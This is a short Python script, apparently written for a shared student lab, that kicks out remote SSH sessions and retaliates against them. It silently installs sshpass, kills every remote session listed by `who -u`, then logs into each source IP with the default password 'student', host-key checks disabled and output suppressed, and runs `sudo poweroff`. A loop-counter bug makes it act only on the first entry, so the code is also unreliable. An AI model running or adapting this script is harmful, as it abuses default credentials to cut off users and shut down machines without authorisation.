import time
import os


print(""" ____  _   _ ___ ____ ___ ____  _____   ____   ____ ____  ___ ____ _____ 
/ ___|| | | |_ _/ ___|_ _|  _ \| ____| / ___| / ___|  _ \|_ _|  _ \_   _|
\___ \| | | || | |    | || | | |  _|   \___ \| |   | |_) || || |_) || |  
 ___) | |_| || | |___ | || |_| | |___   ___) | |___|  _ < | ||  __/ | |  
|____/ \___/|___\____|___|____/|_____| |____/ \____|_| \_\___|_|    |_|""")
print("\nby brycen walker\n--------------------------------------------------------------------------------\n\n")
os.system("apt install sshpass -y 1>/dev/null 2>/dev/null")
while True:
	time.sleep(0.1)
	os.system("who -u | tr -s \" \" | grep -v \"tty\\|pts/1\" | awk \'{print $6}\' > pids.txt")
	os.system("who -u | tr -s \" \" | grep -v \"tty\\|pts/1\" | awk \'{print $7}\' | sed \"s/(//g\" | sed \"s/)//g\" > ips.txt")

	with open("pids.txt", "r") as file:
		pids = file.read().split("\n")
	with open("ips.txt", "r") as file:
		ips = file.read().split("\n")
	pids = pids[:-1]
	ips = ips[:-1]
	for i in pids:
		num = 0
		os.system(f"kill {pids[num]}")
		print(f"shutdown {ips[num]}")
		os.system(f"sshpass -p student ssh -t -o 'StrictHostKeyChecking=no' student@{ips[num]} 'echo student | sudo -S poweroff' 1>/dev/null 2>/dev/null")
		num += 1

	os.system("rm pids.txt; rm ips.txt")
